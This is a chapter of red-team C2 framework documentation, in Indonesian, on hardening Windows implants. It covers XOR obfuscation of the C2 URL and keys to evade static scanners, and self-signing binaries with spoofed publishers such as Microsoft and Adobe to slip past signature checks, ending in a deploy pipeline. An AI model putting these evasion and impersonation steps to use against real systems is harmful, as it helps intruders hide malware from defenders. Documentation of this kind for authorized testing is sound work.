# 18 — OPSEC Hardening: String Encryption & Binary Signing

> Dua teknik untuk membuat implant lebih sulit dianalisis secara statis:
> **compile-time string encryption** menghilangkan IoC berupa plaintext dari binary,
> dan **Authenticode self-signing** membuat binary terlihat sah di mata tool sederhana.

---

## Mengapa Ini Penting?

Ketika kamu build agent standar dengan `make agent-win-stealth`, string seperti:

```
http://192.168.1.10:8080
SpookyOrcaC2AES1
```

...tertanam sebagai plaintext di section `.rodata` binary. Tool seperti `strings`, `FLOSS`, atau
Detect-It-Easy langsung menampilkannya.

```bash
# Tanpa enkripsi — IoC langsung terlihat
strings agent_windows_stealth.exe | grep -E "http|AES|Key"
# → http://192.168.1.10:8080
# → SpookyOrcaC2AES1
```

Dua hardening yang diimplementasikan di sini mengatasi masalah tersebut:

| Teknik | Apa yang disembunyikan | Biaya |
|--------|------------------------|-------|
| XOR string encryption | C2 URL, AES key dari section .rodata | Trivial — dekripsi in-memory saat startup |
| Authenticode self-signing | Ketiadaan signature (melewati cek "is signed?") | Satu langkah tambahan post-build |

---

## Phase 10.8 — Compile-Time String Encryption

### Cara Kerja

```
Build time:
  strenc enc "http://c2.example.com" 5a
  → 322e2e2a6075756b...  (hex-encoded XOR result)

Agent binary:
  serverURLEnc = "322e2e2a6075756b..."   ← hanya hex terenkripsi, bukan URL
  xorKeyHex    = "5a"
  serverURL    = ""                       ← kosong — tidak ada di .rodata

Agent startup (init()):
  serverURL = strenc.Dec(serverURLEnc, 0x5a)
  → "http://c2.example.com"              ← di-XOR in-memory, tidak pernah di disk
```

### Build

```bash
# Standard — URL ada sebagai plaintext
make agent-win-stealth C2_SERVER=http://c2.example.com ENC_KEY=MyKey1234567890

# Encrypted — URL tidak ada sebagai plaintext di binary
make agent-win-encrypted \
  C2_SERVER=http://c2.example.com \
  ENC_KEY=MyKey1234567890 \
  XOR_KEY=a3
```

Parameter `XOR_KEY` adalah satu byte sebagai hex 2 digit (`00`–`ff`). Default: `5a`.
Ganti setiap engagement untuk variasi signature.

### Verifikasi

```bash
# Sebelum: URL terlihat di strings output
strings bin/agent_windows_stealth.exe | grep "example.com"
# → http://c2.example.com

# Sesudah: tidak ada
strings bin/agent_windows_enc.exe | grep "example.com"
# (no output)

# Yang muncul hanya hex terenkripsi — tidak ada konteks untuk dikenali sebagai URL
strings bin/agent_windows_enc.exe | grep -E "^[0-9a-f]{20,}"
# → 322e2e2a6075756b...
```

### Penggunaan Manual (`cmd/strenc`)

```bash
# Build helper
go build -o bin/strenc ./cmd/strenc

# Enkripsi string
./bin/strenc enc "http://192.168.1.10:8080" 5a
# → 322e2e2a6075756b6368746b6c62746b6a746b6a6860626a626a

# Dekripsi balik (verifikasi)
./bin/strenc dec 322e2e2a6075756b6368746b6c62746b6a746b6a6860626a626a 5a
# → http://192.168.1.10:8080
```

### Catatan Penting

- **XOR adalah obfuscation, bukan enkripsi kuat.** Kunci ada di binary (`xorKeyHex`), jadi analis
  yang sudah curiga pasti akan menemukannya. Tujuannya adalah melewati *automated static scanners*
  dan *string-based IoC matching*, bukan menipu analis forensik terlatih.
- Untuk perlindungan lebih kuat, tambahkan garble (`make agent-win-garble`) yang juga mengacak nama
  fungsi dan struktur kode.
- Gabungkan dengan garble untuk hasil terbaik:
  ```bash
  # Encrypt strings dulu, lalu garble
  # (garble tidak punya target Makefile khusus untuk ini — combine manually)
  make agent-win-encrypted C2_SERVER=... XOR_KEY=b7
  # Kemudian gunakan garble build dengan ldflags yang sama
  ```

---

## Phase 10.14 — Self-Signed Authenticode Signing

### Mengapa Binary Harus Signed?

Windows SmartScreen dan beberapa EDR menggunakan signature sebagai sinyal kepercayaan:

| Kondisi | SmartScreen | EDR heuristic |
|---------|-------------|---------------|
| Unsigned | ⚠️ Peringatan keras | Suspicious |
| Self-signed (tidak trusted) | ⚠️ Peringatan lebih lembut | Slightly less suspicious |
| Signed oleh trusted CA | ✅ Tidak ada peringatan | Normal |

Self-signing tidak membuat binary *trusted* secara kriptografis — tapi ia melewati cek
"apakah file ini punya signature?" yang ada di beberapa scanner sederhana dan skrip PowerShell.

### Cara Kerja

```
cmd/sign:
  1. Generate self-signed RSA-2048 cert (CN = publisher name, EKU = Code Signing)
  2. Export ke PFX / PKCS#12 via openssl
  3. Jalankan osslsigncode (Linux) atau signtool (Windows) untuk embed signature
```

### Prerequisites

```bash
# Linux
sudo apt install osslsigncode openssl

# Windows — signtool sudah ada jika Windows SDK terinstall
# Atau download dari:
# https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/
```

### Build & Sign

```bash
# Step 1: Build agent (encrypted atau stealth)
make agent-win-encrypted C2_SERVER=https://c2.example.com ENC_KEY=MyKey XOR_KEY=5a

# Step 2: Sign dengan publisher palsu
make sign SIGN_BINARY=bin/agent_windows_enc.exe SIGN_PUBLISHER="Microsoft Corporation"

# Atau dengan password custom
make sign \
  SIGN_BINARY=bin/agent_windows_enc.exe \
  SIGN_PUBLISHER="Windows Security Health Agent" \
  SIGN_PASS=engagementkey123
```

### Gunakan Cert yang Sudah Ada

```bash
# Generate cert terpisah dulu (simpan untuk reuse)
make sign-cert SIGN_PUBLISHER="Windows Defender Update" SIGN_PASS=mypassword
# → bin/sign.pfx

# Sign beberapa binary dengan cert yang sama
make sign SIGN_BINARY=bin/agent_windows_enc.exe SIGN_CERT=bin/sign.pfx SIGN_PASS=mypassword
make sign SIGN_BINARY=bin/stager.exe            SIGN_CERT=bin/sign.pfx SIGN_PASS=mypassword
```

### Verifikasi Signature

```powershell
# PowerShell (di Windows target atau lab)
Get-AuthenticodeSignature bin\agent_windows_enc.exe

# Output:
# SignerCertificate : [Subject]
#   CN=Microsoft Corporation, O=Authenticode
#   ...
# Status            : UnknownError   ← bukan "Valid" karena self-signed
# StatusMessage     : A certificate chain processed, but terminated in a root
#                     certificate which is not trusted by the trust provider.
```

Status `UnknownError` (bukan `NotSigned`) artinya signature ada — binary terlihat "signed"
meski tidak trusted. Ini adalah tujuannya.

```bash
# Linux — verifikasi dengan osslsigncode
osslsigncode verify -in bin/agent_windows_enc.exe
```

### Manual via `cmd/sign`

```bash
go build -o bin/sign ./cmd/sign

# Generate cert saja
./bin/sign --gen-cert \
  --publisher "Adobe Systems" \
  --subject "Adobe Acrobat Update" \
  --password engagementpass \
  --out my_cert.pfx

# Sign binary dengan cert yang ada
./bin/sign \
  --binary bin/agent_windows_enc.exe \
  --cert my_cert.pfx \
  --password engagementpass \
  --publisher "Adobe Systems"

# Sign dengan auto-generate cert (ephemeral, tidak disimpan)
./bin/sign --binary bin/agent_windows_enc.exe --publisher "Google LLC"
```

---

## Full OPSEC Build Pipeline

Kombinasi semua hardening untuk engagement production:

```bash
# 1. Build encrypted agent (tanpa plaintext C2 URL di binary)
make agent-win-encrypted \
  C2_SERVER=https://c2.yourdomain.com \
  ENC_KEY=C0rp3ngag3m3ntK3y16 \
  SEC_KEY=BackupK3y12345678 \
  XOR_KEY=a7 \
  PROFILE=office365 \
  INTERVAL=60 \
  JITTER=30 \
  KILL_DATE=2026-12-31

# 2. Sign dengan publisher yang cocok dengan lure
make sign \
  SIGN_BINARY=bin/agent_windows_enc.exe \
  SIGN_PUBLISHER="Microsoft Corporation" \
  SIGN_PASS=engmentsecret

# 3. (Opsional) Garble untuk obfuscate nama fungsi/struct
#    Buat script manual karena garble + encrypted ldflags harus dikombinasikan

# 4. Verifikasi hasil akhir
strings bin/agent_windows_enc.exe | grep "yourdomain.com"  # → kosong ✓
strings bin/agent_windows_enc.exe | grep "C0rp3ngag3m3nt"  # → kosong ✓
```

### Checklist Sebelum Deploy

```
□ strings output tidak mengandung C2 URL atau AES key
□ Binary punya Authenticode signature (meski self-signed / UnknownError)
□ Publisher name sesuai dengan lure / context deployment
□ Kill date sudah di-set
□ XOR_KEY berbeda dari engagement sebelumnya
□ PFX cert disimpan aman (untuk reuse di engagement yang sama)
```

---

## Keterbatasan & Peningkatan

| Keterbatasan | Solusi |
|--------------|--------|
| XOR trivial — kunci ada di binary | Gunakan garble untuk obfuscate kunci itu sendiri |
| Self-signed tidak bypass SmartScreen | Beli code signing cert dari CA (DigiCert, Sectigo, dll) |
| AV bisa detect pola XOR decode di `init()` | Gunakan garble untuk obfuscate fungsi init |
| Satu kunci untuk semua string | Gunakan kunci per-string yang berbeda |

---

**Selanjutnya:** [16 — Red Team Scenarios](16-scenarios.md) — gabungkan semua teknik dalam
skenario engagement end-to-end.

---

*Taburtuai C2 — For authorized security testing only.*
*Selalu dapatkan izin tertulis sebelum melakukan penetration testing.*
